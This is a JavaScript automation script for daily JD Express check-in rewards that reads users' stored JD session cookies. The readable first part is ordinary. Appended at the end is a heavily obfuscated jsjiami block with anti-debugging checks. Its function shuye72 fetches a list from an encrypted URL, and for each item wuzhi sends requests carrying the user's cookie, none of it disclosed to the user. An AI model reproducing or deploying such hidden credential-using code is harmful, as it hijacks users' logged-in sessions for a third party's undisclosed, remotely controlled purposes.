/*
京东快递签到
活动入口：https://jingcai-h5.jd.com/#/
签到领豆,14天内满4次和7次享额外奖励，每天运行一次即可
更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js

已支持IOS双京东账号, Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, 小火箭，JSBox, Node.js
============Quantumultx===============
[task_local]
#京东快递签到
10 0 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js, tag=京东快递签到, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_kd.png, enabled=true

================Loon==============
[Script]
cron "10 0 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js, tag=京东快递签到

===============Surge=================
京东快递签到 = type=cron,cronexp="10 0 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js

============小火箭=========
京东快递签到 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_kd.js, cronexpr="10 0 * * *", timeout=3600, enable=true
 */
const $ = new Env('京东快递签到');

const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
const randomCount = $.isNode() ? 20 : 5;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let t = +new Date()
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
const JD_API_HOST = 'https://api.m.jd.com/api';
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await userSignIn();
      await shuye72();
      await showMsg();
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })

function showMsg() {
  return new Promise(resolve => {
    $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    resolve()
  })
}
function userSignIn() {
  return new Promise(resolve => {
    $.post(taskUrl(), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(resp)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 1) {
              console.log(`今日签到成功，获得${data.content[0].title}`)
              message += `今日签到成功，获得${data.content[0].title} 🐶\n`;

            } else if (data.code === -1) {
              console.log(`今日已签到`)
              message += `【签到】失败，今日已签到`;
            } else {
              console.log(`异常：${JSON.stringify(data)}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function taskUrl() {
  return {
    url: `https://lop-proxy.jd.com/jiFenApi/signInAndGetReward`,
    body: '[{"userNo":"$cooMrdGatewayUid$"}]',
    headers: {
      'Host': 'lop-proxy.jd.com',
      'lop-dn': 'jingcai.jd.com',
      'biz-type': 'service-monitor',
      'app-key': 'jexpress',
      'access': 'H5',
      'content-type': 'application/json;charset=utf-8',
      'clientinfo': '{"appName":"jingcai","client":"m"}',
      'accept': 'application/json, text/plain, */*',
      'jexpress-report-time': '1607330170578',
      'x-requested-with': 'XMLHttpRequest',
      'source-client': '2',
      'appparams': '{"appid":158,"ticket_type":"m"}',
      'version': '1.0.0',
      'origin': 'https://jingcai-h5.jd.com',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://jingcai-h5.jd.com/',
      'accept-language': 'zh-CN,zh;q=0.9',
      "Cookie": cookie,
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}

var _0xoda='jsjiami.com.v6',_0x608e=[_0xoda,'wrV/wqNOOsK2XS/Dl2sywrAFFMKzSH4YwpHDni53VmjCp8OSCcO6w6hmw4JKUMOIw6M=','QTrCg8KWwoJNwoPDiWTDo8KOwqrDrQlYw6JN','DQPCjWvCtC0+w4PCmxk=','wrx7wqdSIMOvE3TDkXQ5w7EdAsK4VjNbwo7DniIuE3zCp8OaFMOxw6oswoxLGQ==','AcK5QWJow7nDj8KTw6jDmH4Zw7c=','UMOMXcK6','woBIVsKxwpoKX8OHXMONRyjDiMOwwo3CosK7LsKZdBcGw6MBwr3Dk05qwrLDijjDicKfwqJAw4Auw5bCg2/DscOVLHrCoiXDrHVZVsONQ8K3dcK4AC3DvUxTw4LDmXJ8RMKhOil6woZOw6TCi8OBwpDCh3E=','w6HCjkPDkk8=','G1DDksKyXTrCgcOk','wpMNKTAFw401RjgQXsOYBUMmcUZOw6nDhF9TUcKyEg==','wp4OM8OZdg==','EcO6wq/Dh8K5','w4DDhsKqXk8=','w5xpw4XDrDk=','NgzCh3bDqw==','w4pUw69NOQ==','w7PDpsKOUEPDrw==','wqkSwrs=','wpdPwohrGsOJIF/DuVwSwpAj','w7TDssKd','wp0GKMOmYDnDq8ObVMOQJcKceg==','T8OxwrLCiAo=','w7/CtnpeCg==','cULDihvCscKrZcKBw5tG','SMOzYFVMw5/DsQ==','fMONZsKOw6g=','FMOXwpDDlcKKwrxg','w5RXw6duKQ==','UMOowoPDu8OC','R8OiYEFewpHCv8O9w4DDrVUjw5YHcg4UdMKpYcK7w7J8w7PDl8O9UW5LeMOrASLDtsKYB0fDrcKHbcOow5ANw5zDuMKZOMKvwqRGwptsw4/CisK8w53DhzDDuFfCtMKdwrzDoQ==','w51ow7pOGA==','TMO6fVRDw5/CrcK/w4rDulE5w5YNeFgWe8KrYcKhwqtAw7LDicOnTGQLL8K+AXHCt8OFDgzCusOANcK4w44Iw6/CvMOPMcOzw7Yew5R7wpvDiMOnwovCj3jDkkPCr8Kcw6DDuj57wqdHQmdew6HCjcKdw6rDqcKwK8OEwpnDvgzCv8OJw7bCvgJgwoPCkMKPw5tTEsK7w7LCscOuaMOIw77DhcOKfXTDrsOWw4fDucOQE8O4w5ltwpPDvsK2LcO7w6vDszVfwoDDtMK6wpArE37Dl3t7w5hBw6Y1a2ITZcKSczDCg8KXw5TDlsKxw6ZRZ8KZOMOxwp7DlBgAw5cZw5o3w4bCg8K3A8KqwqU3woRjS8KULsKGU2jDszE1NistEHHDnz4pcQ==','wrDDih5pCMKWwrXCrEHClsORwqnDkMOdworDt8K1XCU/P8OFEDnDiMOAYMKbSxfDvcKDw4XDuVpGATcIOMK3wpQcwrZQwrZWwphcwqLDgnXDnMOvdyoJw5o6wrchXsO2w6s9PSpfJMOEw6TCscK7w4TCgVXCtsO/w53Crj3CumPDlX5dw5jCkcOtdcONwq3CihdIw6p9wo1pZ8O6','w68Aw7k2','dMKdw7bDhR0=','dsOVw5hswqQ=','w5t+w73Dmxk=','PMKWfMORw78=','I27Dv8KIGQ==','HcORcMK4Hw==','wqM2wrLCokY=','aMOJw4pewpI=','w7DDkcKjXkI=','X8O5Z0U=','wqUww6o=','bMOsw4Ra','woHCjcOlceith+azn+Wmn+i3pO+9mOivneajnuaehOe+iei1oumEuOivow==','w79cw6JzNQ==','aWUfw6NN','CsOQS8KKAg==','wpQpwpXDlXg=','woEtw7wISQ==','w6fDokQ/P8OB','w7AIwpURwrV5','w5jDkMKgwpF4','wp0jw6k=','SCHCh8KD','w7cDJ8O66K+E5rC+5aaI6Lah77yZ6K2g5qKg5py3572/6LW56YSq6Kyr','WMOERsKcw40=','wosYLzMT','acO5XkhJ','AGTDp8KaJA==','wrAWO8ODwpU=','wqh3w7bDv8KMwqnDhWrChB3DgUYgUx7CjSLCizPDniLCkcOFwrV3ccOdwrDDhU3CmsKiw5TDmB3DswhtwpbCkBdoQx8Ww5k7wqFaRcOYKTLDqMKww5zCizxaw7MnwosfNEsCwqnDlA==','woETwrfDrlhXFsKcw7fDj8KAw5zDlXctwpgFw6rCoMKxAsOMwq1ZMMKxwq/Cll/Dn13Diz1Gw4HCmlNpMnnDtMK/wrvCuVM3DMKLJ8OUR8OMw7vDg8Kow4FFYAHDqnTCoBbDl2rDnMOaIivDlMKJwrvCnsOUbBBpw5TDo8Kuwr3DocKowr19A3xBwrzDv8Kcw4DCvBYPDgVAHSEnwrFswr3CiiXDqzEQVFzCosKhw6wawonDncKgfMOcPkYywr5hw6vDoQkoFsKqQjNYw7rCombCoQRCwobDqcOfwoLCmMOrVF1YQsOrHg4YwonCsA==','EcO+wo/CsVY=','w68dwqEkwpE=','wqlYcsKqwr4=','w6kww7zChGY=','OsOKwpfCslg=','w47DpsKXenI=','JMO/asKcCA==','dcO0w6R9woU=','wrU2w4g+ZA==','b8OUw7FWwp8=','w4zClcOtUcOY','wolsNg==','wqU+w4NpOg==','w6TCmcO4T8Oy','w4Vjw68=','woRNWsKk','w45IEjborLXms6DlppLotKnvv5borYjmo5bmnLvnvJvotL3phpTorJs=','wpAjAcO9aw==','e8KSw6TDqBlXPw==','w5ltw7rDqgw=','wpMYw6F/GQ==','QiHCnsKHw6kIwpM=','w43CqcObX8OEw7U=','dsOqw65zwqI=','w4krw47CoGnDn0k=','wqF5JxHCkMOHw4dcwrvDnH3Cuz4=','wqAZwqPDoEBT','wqMjw4s4SQ==','Snslw499','w4YBwpkdwoI=','U2pAYMOZwpw=','wopoNh7ChcOHw5c=','LcKUwrLDj8KGwoBAwothw5/DlcKUwr4=','VkgZw60=','LFDDh8KXYA==','wqUww6pOI8O7','wpFcwoDDjmM=','G8KFwrbDh8KW','w5bCnhbDlWU=','cF4Vw759','wo8RwpPChF4=','EwM2bhfDmMKLw4/CvMObw54D','UcKTw5/ClMOWYsKOFDodBMKpSsOBPsKJc8KmwrtINMOUbQUvw4DDuno0L8KuM8Kt','jgfzzsRDTrFjJixBKaHVmLi.com.v6=='];(function(_0xcdd87a,_0x2dd4d5,_0x3afaec){var _0x256842=function(_0x421bda,_0x3a0f80,_0x571de5,_0x4dceb3,_0x2c05f3){_0x3a0f80=_0x3a0f80>>0x8,_0x2c05f3='po';var _0x2bcee3='shift',_0x3beb9d='push';if(_0x3a0f80<_0x421bda){while(--_0x421bda){_0x4dceb3=_0xcdd87a[_0x2bcee3]();if(_0x3a0f80===_0x421bda){_0x3a0f80=_0x4dceb3;_0x571de5=_0xcdd87a[_0x2c05f3+'p']();}else if(_0x3a0f80&&_0x571de5['replace'](/[gfzzRDTrFJxBKHVL=]/g,'')===_0x3a0f80){_0xcdd87a[_0x3beb9d](_0x4dceb3);}}_0xcdd87a[_0x3beb9d](_0xcdd87a[_0x2bcee3]());}return 0x79dda;};var _0x3621ba=function(){var _0x2aa833={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x4b0842,_0x4e3130,_0xb34c4,_0x56200d){_0x56200d=_0x56200d||{};var _0x3b11f6=_0x4e3130+'='+_0xb34c4;var _0x461a15=0x0;for(var _0x461a15=0x0,_0x15b2e6=_0x4b0842['length'];_0x461a15<_0x15b2e6;_0x461a15++){var _0x431d9c=_0x4b0842[_0x461a15];_0x3b11f6+=';\x20'+_0x431d9c;var _0x18289f=_0x4b0842[_0x431d9c];_0x4b0842['push'](_0x18289f);_0x15b2e6=_0x4b0842['length'];if(_0x18289f!==!![]){_0x3b11f6+='='+_0x18289f;}}_0x56200d['cookie']=_0x3b11f6;},'removeCookie':function(){return'dev';},'getCookie':function(_0x5c9089,_0x2538cd){_0x5c9089=_0x5c9089||function(_0x321087){return _0x321087;};var _0x41c595=_0x5c9089(new RegExp('(?:^|;\x20)'+_0x2538cd['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x57b4bd=typeof _0xoda=='undefined'?'undefined':_0xoda,_0x38d674=_0x57b4bd['split'](''),_0x55cd2c=_0x38d674['length'],_0x50d293=_0x55cd2c-0xe,_0x5ebb25;while(_0x5ebb25=_0x38d674['pop']()){_0x55cd2c&&(_0x50d293+=_0x5ebb25['charCodeAt']());}var _0x5bfa6d=function(_0x35e206,_0x326066,_0x2860d2){_0x35e206(++_0x326066,_0x2860d2);};_0x50d293^-_0x55cd2c===-0x524&&(_0x5ebb25=_0x50d293)&&_0x5bfa6d(_0x256842,_0x2dd4d5,_0x3afaec);return _0x5ebb25>>0x2===0x14b&&_0x41c595?decodeURIComponent(_0x41c595[0x1]):undefined;}};var _0x48bda4=function(){var _0x555609=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x555609['test'](_0x2aa833['removeCookie']['toString']());};_0x2aa833['updateCookie']=_0x48bda4;var _0x1a1a32='';var _0x833d5f=_0x2aa833['updateCookie']();if(!_0x833d5f){_0x2aa833['setCookie'](['*'],'counter',0x1);}else if(_0x833d5f){_0x1a1a32=_0x2aa833['getCookie'](null,'counter');}else{_0x2aa833['removeCookie']();}};_0x3621ba();}(_0x608e,0x13f,0x13f00));var _0x493d=function(_0x2d4d68,_0x456ea0){_0x2d4d68=~~'0x'['concat'](_0x2d4d68);var _0x36fe35=_0x608e[_0x2d4d68];if(_0x493d['nRmMtO']===undefined){(function(){var _0x417c3b;try{var _0x216113=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x417c3b=_0x216113();}catch(_0x2f175d){_0x417c3b=window;}var _0x1df161='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x417c3b['atob']||(_0x417c3b['atob']=function(_0x381a1d){var _0x206c62=String(_0x381a1d)['replace'](/=+$/,'');for(var _0x2d5db2=0x0,_0x1293d3,_0x2f9020,_0x4da22c=0x0,_0x2c1741='';_0x2f9020=_0x206c62['charAt'](_0x4da22c++);~_0x2f9020&&(_0x1293d3=_0x2d5db2%0x4?_0x1293d3*0x40+_0x2f9020:_0x2f9020,_0x2d5db2++%0x4)?_0x2c1741+=String['fromCharCode'](0xff&_0x1293d3>>(-0x2*_0x2d5db2&0x6)):0x0){_0x2f9020=_0x1df161['indexOf'](_0x2f9020);}return _0x2c1741;});}());var _0x17695e=function(_0x55d9e6,_0x456ea0){var _0x3345ac=[],_0x4212f8=0x0,_0x303b64,_0x31af8b='',_0x436726='';_0x55d9e6=atob(_0x55d9e6);for(var _0x3e65ad=0x0,_0x50b67a=_0x55d9e6['length'];_0x3e65ad<_0x50b67a;_0x3e65ad++){_0x436726+='%'+('00'+_0x55d9e6['charCodeAt'](_0x3e65ad)['toString'](0x10))['slice'](-0x2);}_0x55d9e6=decodeURIComponent(_0x436726);for(var _0x421bd5=0x0;_0x421bd5<0x100;_0x421bd5++){_0x3345ac[_0x421bd5]=_0x421bd5;}for(_0x421bd5=0x0;_0x421bd5<0x100;_0x421bd5++){_0x4212f8=(_0x4212f8+_0x3345ac[_0x421bd5]+_0x456ea0['charCodeAt'](_0x421bd5%_0x456ea0['length']))%0x100;_0x303b64=_0x3345ac[_0x421bd5];_0x3345ac[_0x421bd5]=_0x3345ac[_0x4212f8];_0x3345ac[_0x4212f8]=_0x303b64;}_0x421bd5=0x0;_0x4212f8=0x0;for(var _0x314ade=0x0;_0x314ade<_0x55d9e6['length'];_0x314ade++){_0x421bd5=(_0x421bd5+0x1)%0x100;_0x4212f8=(_0x4212f8+_0x3345ac[_0x421bd5])%0x100;_0x303b64=_0x3345ac[_0x421bd5];_0x3345ac[_0x421bd5]=_0x3345ac[_0x4212f8];_0x3345ac[_0x4212f8]=_0x303b64;_0x31af8b+=String['fromCharCode'](_0x55d9e6['charCodeAt'](_0x314ade)^_0x3345ac[(_0x3345ac[_0x421bd5]+_0x3345ac[_0x4212f8])%0x100]);}return _0x31af8b;};_0x493d['dAIlka']=_0x17695e;_0x493d['okWuZn']={};_0x493d['nRmMtO']=!![];}var _0x364e1f=_0x493d['okWuZn'][_0x2d4d68];if(_0x364e1f===undefined){if(_0x493d['dzTlpg']===undefined){var _0x429c7b=function(_0xa4e3a2){this['bQBKtR']=_0xa4e3a2;this['bXhvbb']=[0x1,0x0,0x0];this['uYyktP']=function(){return'newState';};this['pVNavO']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['LNkYcX']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x429c7b['prototype']['FMdovH']=function(){var _0x45b358=new RegExp(this['pVNavO']+this['LNkYcX']);var _0x3f9e94=_0x45b358['test'](this['uYyktP']['toString']())?--this['bXhvbb'][0x1]:--this['bXhvbb'][0x0];return this['LhsfAV'](_0x3f9e94);};_0x429c7b['prototype']['LhsfAV']=function(_0x7e952b){if(!Boolean(~_0x7e952b)){return _0x7e952b;}return this['JcLblX'](this['bQBKtR']);};_0x429c7b['prototype']['JcLblX']=function(_0x1588d9){for(var _0x521987=0x0,_0x37f5f7=this['bXhvbb']['length'];_0x521987<_0x37f5f7;_0x521987++){this['bXhvbb']['push'](Math['round'](Math['random']()));_0x37f5f7=this['bXhvbb']['length'];}return _0x1588d9(this['bXhvbb'][0x0]);};new _0x429c7b(_0x493d)['FMdovH']();_0x493d['dzTlpg']=!![];}_0x36fe35=_0x493d['dAIlka'](_0x36fe35,_0x456ea0);_0x493d['okWuZn'][_0x2d4d68]=_0x36fe35;}else{_0x36fe35=_0x364e1f;}return _0x36fe35;};var _0x5cecee=function(){var _0x7662ea=!![];return function(_0x3edb0c,_0x4e69ca){var _0x36082a=_0x7662ea?function(){if(_0x4e69ca){var _0x2d48c7=_0x4e69ca['apply'](_0x3edb0c,arguments);_0x4e69ca=null;return _0x2d48c7;}}:function(){};_0x7662ea=![];return _0x36082a;};}();var _0x2048df=_0x5cecee(this,function(){var _0x231e3b=function(){return'\x64\x65\x76';},_0x1cfe47=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x442686=function(){var _0x475a6c=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x475a6c['\x74\x65\x73\x74'](_0x231e3b['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x169570=function(){var _0x968533=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x968533['\x74\x65\x73\x74'](_0x1cfe47['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x5bb808=function(_0x29cd18){var _0x1530c2=~-0x1>>0x1+0xff%0x0;if(_0x29cd18['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x1530c2)){_0x1e0f23(_0x29cd18);}};var _0x1e0f23=function(_0x2088d8){var _0x29e6b2=~-0x4>>0x1+0xff%0x0;if(_0x2088d8['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x29e6b2){_0x5bb808(_0x2088d8);}};if(!_0x442686()){if(!_0x169570()){_0x5bb808('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x5bb808('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x5bb808('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x2048df();function wuzhi(_0x17660b){var _0x5c9de9={'knfLC':function(_0x3b5a15,_0x58735f){return _0x3b5a15(_0x58735f);},'tXqSS':function(_0x30ad29,_0x4b1f6b){return _0x30ad29!==_0x4b1f6b;},'rruBp':_0x493d('0','EtCe'),'Dccja':_0x493d('1','53ER'),'Nsjye':function(_0x540aa0){return _0x540aa0();},'NWWfe':function(_0x57bfce,_0x21cf15){return _0x57bfce(_0x21cf15);},'Jujda':function(_0x52d47d,_0x45d5ac){return _0x52d47d===_0x45d5ac;},'jDcae':_0x493d('2','@9vm'),'ILDjE':_0x493d('3','4dRS'),'bHKvR':_0x493d('4','cmdH'),'ZSjah':_0x493d('5','bvcO'),'ueMuP':_0x493d('6','P]BZ'),'Pjomr':_0x493d('7','y1tD'),'xFfVT':_0x493d('8','bvcO'),'mPFVa':_0x493d('9','pRNN'),'fEnuD':_0x493d('a','4Bt#'),'YmokS':_0x493d('b','A@yG'),'ozsUu':_0x493d('c','EtCe')};let _0x82ea6d=_0x17660b[_0x493d('d','5Rst')];let _0x511e6f={'url':_0x493d('e','CwnI')+t,'headers':{'Host':_0x5c9de9[_0x493d('f','QzEA')],'Content-Type':_0x5c9de9[_0x493d('10','5vQ[')],'origin':_0x5c9de9[_0x493d('11','dKew')],'Accept-Encoding':_0x5c9de9[_0x493d('12','MtfA')],'Cookie':cookie,'Connection':_0x5c9de9[_0x493d('13','y1tD')],'Accept':_0x5c9de9[_0x493d('14','OUE8')],'User-Agent':$[_0x493d('15','dKew')]()?process[_0x493d('16','r!KU')][_0x493d('17','bvcO')]?process[_0x493d('18','Oz8V')][_0x493d('19','QzEA')]:_0x5c9de9[_0x493d('1a','qU&h')](require,_0x5c9de9[_0x493d('1b','vkc8')])[_0x493d('1c','M(g0')]:$[_0x493d('1d','pRNN')](_0x5c9de9[_0x493d('1e','4Bt#')])?$[_0x493d('1f','5vQ[')](_0x5c9de9[_0x493d('20','OUE8')]):_0x5c9de9[_0x493d('21','QB$#')],'referer':_0x493d('22','pRNN'),'Accept-Language':_0x5c9de9[_0x493d('23','OUE8')]},'body':_0x493d('24','pRNN')+_0x82ea6d+_0x493d('25','vkc8')+t+_0x493d('26','r7^p')+t};return new Promise(_0xb3b223=>{var _0x1a5d51={'MNkhX':function(_0x3b9af9,_0x51a50d){return _0x5c9de9[_0x493d('27','SodF')](_0x3b9af9,_0x51a50d);},'HLozI':function(_0x1398ec,_0x5cdf55){return _0x5c9de9[_0x493d('28','qJym')](_0x1398ec,_0x5cdf55);},'YVlTx':_0x5c9de9[_0x493d('29','MtfA')],'XUXRL':_0x5c9de9[_0x493d('2a','QZ#t')],'ILKxz':function(_0x4cfb7e){return _0x5c9de9[_0x493d('2b','xow4')](_0x4cfb7e);},'BLNga':function(_0x1e28fa,_0x1f6295){return _0x5c9de9[_0x493d('2c','0#Yz')](_0x1e28fa,_0x1f6295);}};if(_0x5c9de9[_0x493d('2d','@9vm')](_0x5c9de9[_0x493d('2e','qJym')],_0x5c9de9[_0x493d('2f','dKew')])){$[_0x493d('30','pRNN')](_0x511e6f,(_0x3ef17d,_0x57a547,_0x602ebb)=>{try{if(_0x3ef17d){console[_0x493d('31','r7^p')]($[_0x493d('32','qJym')]+_0x493d('33','9MOr'));}else{if(_0x1a5d51[_0x493d('34','OUE8')](safeGet,_0x602ebb)){if(_0x1a5d51[_0x493d('35','53ER')](_0x1a5d51[_0x493d('36','0#Yz')],_0x1a5d51[_0x493d('37','r!KU')])){_0x602ebb=JSON[_0x493d('38','k6]h')](_0x602ebb);}else{$[_0x493d('39','zd%b')](e);}}}}catch(_0x3a6074){$[_0x493d('3a','FoC9')](_0x3a6074);}finally{_0x1a5d51[_0x493d('3b','Oz8V')](_0xb3b223);}});}else{if(err){console[_0x493d('3c','k6]h')]($[_0x493d('3d','P]BZ')]+_0x493d('3e','QzEA'));}else{if(_0x1a5d51[_0x493d('3f','4Bt#')](safeGet,data)){data=JSON[_0x493d('40','CwnI')](data);}}}});}function shuye72(){var _0x18c788={'ISspW':function(_0x1f56ee,_0x5374c9){return _0x1f56ee(_0x5374c9);},'szSpV':function(_0x21e6dd,_0x19cf6c){return _0x21e6dd!==_0x19cf6c;},'CtEkT':function(_0x578815,_0x16845e){return _0x578815<_0x16845e;},'DzFEH':function(_0x29abd2,_0x1fbbdf){return _0x29abd2===_0x1fbbdf;},'bgksY':_0x493d('41','pRNN'),'TsWEU':_0x493d('42','xow4'),'wyMBr':function(_0x583f0a){return _0x583f0a();},'mYXih':_0x493d('43','Ip]&'),'laNbk':_0x493d('44','Yf9b'),'EUMwB':_0x493d('45','r!KU')};return new Promise(_0xa71905=>{var _0x2aa4b9={'GavNX':function(_0x32236c,_0x1c21b0){return _0x18c788[_0x493d('46','%)yD')](_0x32236c,_0x1c21b0);},'ZGltH':function(_0x1e5235,_0x3140dd){return _0x18c788[_0x493d('47','FoC9')](_0x1e5235,_0x3140dd);},'tgGLU':function(_0x36cfa2,_0x495bba){return _0x18c788[_0x493d('48','A@yG')](_0x36cfa2,_0x495bba);},'RoECe':function(_0x4f848f,_0x10b79a){return _0x18c788[_0x493d('49','TQ)Z')](_0x4f848f,_0x10b79a);},'kRUVy':_0x18c788[_0x493d('4a','%)yD')],'ZfkIE':_0x18c788[_0x493d('4b','dKew')],'VhMkB':function(_0x167f8b){return _0x18c788[_0x493d('4c','0#Yz')](_0x167f8b);},'yaafB':function(_0x10992e){return _0x18c788[_0x493d('4d','qJym')](_0x10992e);}};if(_0x18c788[_0x493d('4e','k6]h')](_0x18c788[_0x493d('4f','qJym')],_0x18c788[_0x493d('50','9MOr')])){$[_0x493d('51',')TLm')]({'url':_0x18c788[_0x493d('52','r7^p')],'headers':{'User-Agent':_0x18c788[_0x493d('53','9MOr')]}},async(_0x4576bf,_0x327ead,_0x23d688)=>{try{if(_0x4576bf){console[_0x493d('54','MtfA')]($[_0x493d('55','A@yG')]+_0x493d('56',')TLm'));}else{if(_0x2aa4b9[_0x493d('57','QzEA')](safeGet,_0x23d688)){$[_0x493d('58','SodF')]=JSON[_0x493d('59','MtfA')](_0x23d688);if(_0x2aa4b9[_0x493d('5a','r7^p')]($[_0x493d('5b','P]BZ')][_0x493d('5c','9MOr')],0x0)){for(let _0x3402a4=0x0;_0x2aa4b9[_0x493d('5d','qJym')](_0x3402a4,$[_0x493d('5e','TQ)Z')][_0x493d('5f',')TLm')][_0x493d('60','r!KU')]);_0x3402a4++){if(_0x2aa4b9[_0x493d('61','k6]h')](_0x2aa4b9[_0x493d('62','53ER')],_0x2aa4b9[_0x493d('63','FoC9')])){$[_0x493d('64','ciPX')](e);}else{let _0x3cdef4=$[_0x493d('65',')TLm')][_0x493d('66','yFxn')][_0x3402a4];await $[_0x493d('67','53ER')](0x1f4);await _0x2aa4b9[_0x493d('68','5Rst')](wuzhi,_0x3cdef4);}}}}}}catch(_0x4d7323){$[_0x493d('69','r7^p')](_0x4d7323);}finally{_0x2aa4b9[_0x493d('6a','PZDF')](_0xa71905);}});}else{_0x2aa4b9[_0x493d('6b','yFxn')](_0xa71905);}});};_0xoda='jsjiami.com.v6';

// prettier-ignore
